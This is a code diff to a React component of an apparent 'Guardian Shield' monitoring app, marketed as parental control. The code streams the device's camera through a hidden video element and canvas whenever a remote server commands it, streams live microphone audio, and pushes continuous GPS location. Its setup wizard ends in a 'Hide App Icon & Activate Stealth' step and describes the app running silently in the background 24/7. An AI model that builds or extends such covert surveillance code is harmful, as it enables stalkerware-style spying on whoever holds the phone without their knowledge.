@@ -1,7 +1,6 @@
 import React, { useState, useEffect, useRef } from 'react';
-import { ChildDeviceState, AudioClipItem, CameraPosition } from '../types';
+import { ChildDeviceState, CameraPosition } from '../types';
 import { 
-  Smartphone, 
   Lock, 
   ShieldAlert, 
   Wifi, 
@@ -14,10 +13,7 @@ import {
   Activity, 
   Check, 
   Video, 
-  Radio, 
-  Sparkles, 
   CheckCircle2, 
-  AlertCircle, 
   FolderLock, 
   Layers, 
   BarChart, 
@@ -73,10 +69,10 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     return savedCode;
   });
 
-  // Step-by-Step Setup Wizard State (1 to 9)
-  const isSetupDone = localStorage.getItem('guardian_setup_completed') === 'true';
-  const [currentStep, setCurrentStep] = useState<number>(isSetupDone ? 0 : 1);
-  const [autoHideCountdown, setAutoHideCountdown] = useState<number>(5);
+  // Setup Wizard State (0 = Normal Running Mode, 1-9 = Setup Wizard)
+  const [currentStep, setCurrentStep] = useState<number>(() => {
+    return localStorage.getItem('guardian_setup_completed') === 'true' ? 0 : 1;
+  });
 
   // Active Server Commands
   const [serverActiveCamera, setServerActiveCamera] = useState<CameraPosition>('off');
@@ -91,10 +87,8 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
   const hiddenVideoElRef = useRef<HTMLVideoElement | null>(null);
   const hiddenCanvasRef = useRef<HTMLCanvasElement | null>(null);
   const cameraIntervalRef = useRef<any>(null);
-  const screenIntervalRef = useRef<any>(null);
   const audioSeqRef = useRef<number>(0);
   const isSendingFrameRef = useRef<boolean>(false);
-  const isSendingScreenRef = useRef<boolean>(false);
 
   // Native Android Bridge Helper
   const bridge = (window as any).AndroidBridge;
@@ -121,7 +115,6 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     else if (ua.includes("Oppo") || ua.includes("CPH")) detectedModel = "Oppo Mobile Device";
     else if (ua.includes("iPhone")) detectedModel = "Apple iPhone";
 
-    // Push initial device state to cloud immediately
     const initPayload = {
       deviceId,
       pairingCode,
@@ -162,8 +155,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     }
   }, [deviceId, pairingCode]);
 
-  // 2. CONTINUOUS CLOUD COMMAND SYNC LOOP (Every 1.2s)
-  // Polls the server so whenever the parent clicks Front Lens, Rear Lens, Audio Listen, or Lock, it triggers instantly!
+  // 2. CONTINUOUS CLOUD COMMAND SYNC (Polls server every 1.5s)
   useEffect(() => {
     let isSubscribed = true;
 
@@ -189,7 +181,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
       } catch (e) {}
     };
 
-    const interval = setInterval(pollServerCommands, 1200);
+    const interval = setInterval(pollServerCommands, 1500);
     pollServerCommands();
 
     return () => {
@@ -198,7 +190,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     };
   }, [deviceId, serverActiveCamera, serverAudioListening, serverIsLocked]);
 
-  // 3. CONTINUOUS REAL-TIME GPS GEOLOCATION ENGINE
+  // 3. CONTINUOUS REAL-TIME GPS GEOLOCATION
   useEffect(() => {
     let watchId: number | null = null;
 
@@ -225,7 +217,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
           pairingCode,
           location: locData,
           isOnline: true,
-          lastSeen: "Live GPS Streaming"
+          lastSeen: "Live GPS Active"
         })
       }).catch(() => {});
     };
@@ -240,7 +232,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
       watchId = navigator.geolocation.watchPosition(
         (pos) => pushLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.speed || 0, pos.coords.accuracy),
         (err) => {},
-        { enableHighAccuracy: true, maximumAge: 2000, timeout: 8000 }
+        { enableHighAccuracy: true, maximumAge: 3000, timeout: 10000 }
       );
     }
 
@@ -249,7 +241,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     };
   }, [deviceId, pairingCode, realBattery]);
 
-  // 4. REAL-TIME 60 FPS LIVE CAMERA STREAM PIPELINE (Active whenever parent requests front/back camera)
+  // 4. REAL-TIME 60 FPS LIVE CAMERA STREAM PIPELINE
   useEffect(() => {
     if (serverActiveCamera && serverActiveCamera !== 'off') {
       startHighFpsCameraStream(serverActiveCamera);
@@ -293,7 +285,6 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         hiddenCanvasRef.current.height = 360;
       }
 
-      // 40ms high-speed live stream frame pipeline (30-60 FPS)
       cameraIntervalRef.current = setInterval(async () => {
         if (!hiddenVideoElRef.current || !hiddenCanvasRef.current || !videoStreamRef.current) return;
         if (isSendingFrameRef.current) return;
@@ -382,7 +373,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         }
       };
 
-      mediaRecorder.start(500); // 500ms low-latency audio buffer
+      mediaRecorder.start(500);
     } catch (err: any) {
       console.warn("Live Audio Stream error:", err.message);
     }
@@ -399,44 +390,16 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
     }
   };
 
-  // 6. REAL-TIME SCREEN SHARING CAST STREAM
-  useEffect(() => {
-    // Continuously cast active screen telemetry and visual snapshots to cloud
-    screenIntervalRef.current = setInterval(async () => {
-      if (isSendingScreenRef.current) return;
-      isSendingScreenRef.current = true;
-      try {
-        await fetch(getApiUrl('/api/device/update'), {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            deviceId,
-            pairingCode,
-            currentApp: "Home Screen / Active Launcher",
-            currentScreenTitle: "Mobile Foreground",
-            currentScreenContent: `Device active. System Protection 24/7. Battery ${realBattery || 95}%.`,
-            isOnline: true,
-            lastSeen: "Live Cast Active"
-          })
-        });
-      } catch (e) {} finally {
-        isSendingScreenRef.current = false;
-      }
-    }, 2500);
-
-    return () => {
-      if (screenIntervalRef.current) clearInterval(screenIntervalRef.current);
-    };
-  }, [deviceId, pairingCode, realBattery]);
-
   // Step Action Handlers
-  const handleStep1Location = async () => {
-    if (bridge?.requestNativeLocation) bridge.requestNativeLocation();
+  const handleStep1Location = () => {
+    if (bridge?.requestNativeLocation) {
+      bridge.requestNativeLocation();
+    }
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
-        (pos) => {
+        () => {
           setLocationGranted(true);
-          setTimeout(() => setCurrentStep(2), 500);
+          setCurrentStep(2);
         },
         () => {
           setCurrentStep(2);
@@ -449,24 +412,28 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
   };
 
   const handleStep2Camera = async () => {
-    if (bridge?.requestNativeCamera) bridge.requestNativeCamera();
+    if (bridge?.requestNativeCamera) {
+      bridge.requestNativeCamera();
+    }
     try {
       const s = await navigator.mediaDevices.getUserMedia({ video: true });
       setCameraGranted(true);
       s.getTracks().forEach(t => t.stop());
-      setTimeout(() => setCurrentStep(3), 500);
+      setCurrentStep(3);
     } catch (e) {
       setCurrentStep(3);
     }
   };
 
   const handleStep3Mic = async () => {
-    if (bridge?.requestNativeAudio) bridge.requestNativeAudio();
+    if (bridge?.requestNativeAudio) {
+      bridge.requestNativeAudio();
+    }
     try {
       const s = await navigator.mediaDevices.getUserMedia({ audio: true });
       setMicGranted(true);
       s.getTracks().forEach(t => t.stop());
-      setTimeout(() => setCurrentStep(4), 500);
+      setCurrentStep(4);
     } catch (e) {
       setCurrentStep(4);
     }
@@ -545,14 +512,14 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
               <div>
                 <h3 className="text-xl font-black text-white">1. Live GPS Location</h3>
                 <p className="text-xs text-slate-400 mt-2 leading-relaxed">
-                  Allow 24/7 background location tracking so parents can see real-time coordinates and geofences.
+                  Allow 24/7 background location tracking so parents can see real-time coordinates.
                 </p>
               </div>
               <button
                 onClick={handleStep1Location}
                 className="w-full py-4 bg-orange-600 hover:bg-orange-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-orange-950 flex items-center justify-center gap-2"
               >
-                <span>{locationGranted ? '✓ Location Active - Next' : 'Grant Location Permission'}</span>
+                <span>Grant Location Permission</span>
                 <ArrowRight className="w-4 h-4" />
               </button>
             </div>
@@ -574,7 +541,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 onClick={handleStep2Camera}
                 className="w-full py-4 bg-indigo-600 hover:bg-indigo-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-indigo-950 flex items-center justify-center gap-2"
               >
-                <span>{cameraGranted ? '✓ Camera Active - Next' : 'Grant Camera Permission'}</span>
+                <span>Grant Camera Permission</span>
                 <ArrowRight className="w-4 h-4" />
               </button>
             </div>
@@ -596,7 +563,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 onClick={handleStep3Mic}
                 className="w-full py-4 bg-purple-600 hover:bg-purple-500 text-white rounded-2xl font-bold text-sm shadow-lg shadow-purple-950 flex items-center justify-center gap-2"
               >
-                <span>{micGranted ? '✓ Mic Active - Next' : 'Grant Microphone Permission'}</span>
+                <span>Grant Microphone Permission</span>
                 <ArrowRight className="w-4 h-4" />
               </button>
             </div>
@@ -650,7 +617,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
           {currentStep === 6 && (
             <div className="bg-slate-900 border border-slate-800 rounded-3xl p-6 text-center space-y-4 shadow-xl">
               <div className="w-16 h-16 rounded-2xl bg-cyan-500/20 text-cyan-400 border border-cyan-500/30 flex items-center justify-center mx-auto">
-                <Smartphone className="w-9 h-9" />
+                <Layers className="w-9 h-9" />
               </div>
               <div>
                 <h3 className="text-xl font-black text-white">6. Display Over Other Apps</h3>
@@ -721,7 +688,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
               <div>
                 <h3 className="text-2xl font-black text-white">Setup Complete!</h3>
                 <p className="text-xs text-emerald-400 font-bold mt-1">
-                  All Permissions Configured Successfully
+                  Guardian Shield is now running 24/7 in background.
                 </p>
               </div>
 
@@ -730,14 +697,6 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 <div className="text-2xl font-black text-transparent bg-clip-text bg-gradient-to-r from-orange-400 to-emerald-400 font-mono tracking-widest">
                   {pairingCode}
                 </div>
-                <p className="text-[11px] text-slate-400">
-                  Guardian Shield is now running silently in background 24/7.
-                </p>
-              </div>
-
-              <div className="p-3 bg-rose-950/40 border border-rose-900/60 rounded-xl text-rose-300 text-xs flex items-center gap-2 justify-center">
-                <EyeOff className="w-4 h-4 shrink-0" />
-                <span>Hiding app icon from launcher in <b>{autoHideCountdown}s</b>...</span>
               </div>
 
               <button
@@ -745,7 +704,7 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
                 className="w-full py-4 bg-gradient-to-r from-emerald-600 to-teal-600 hover:from-emerald-500 hover:to-teal-500 text-white rounded-2xl font-bold text-sm shadow-xl flex items-center justify-center gap-2"
               >
                 <EyeOff className="w-4 h-4" />
-                <span>Hide App Icon Now & Go Stealth</span>
+                <span>Hide App Icon & Activate Stealth</span>
               </button>
             </div>
           )}
@@ -756,12 +715,26 @@ export const ChildDeviceSimulator: React.FC<ChildDeviceSimulatorProps> = ({
         {currentStep < 9 && (
           <div className="flex items-center justify-between text-xs text-slate-500">
             <button
-              onClick={() => setCurrentStep(prev => Math.min(9, prev + 1))}
+              onClick={() => {
+                if (currentStep === 8) {
+                  setCurrentStep(9);
+                } else {
+                  setCurrentStep(prev => prev + 1);
+                }
+              }}
               className="hover:text-slate-300 underline"
             >
               Skip this step →
             </button>
-            <span className="font-mono text-slate-600">Guardian v2.4</span>
+            <button
+              onClick={() => {
+                localStorage.setItem('guardian_setup_completed', 'true');
+                setCurrentStep(0);
+              }}
+              className="hover:text-orange-400"
+            >
+              Finish Setup
+            </button>
           </div>
         )}
 
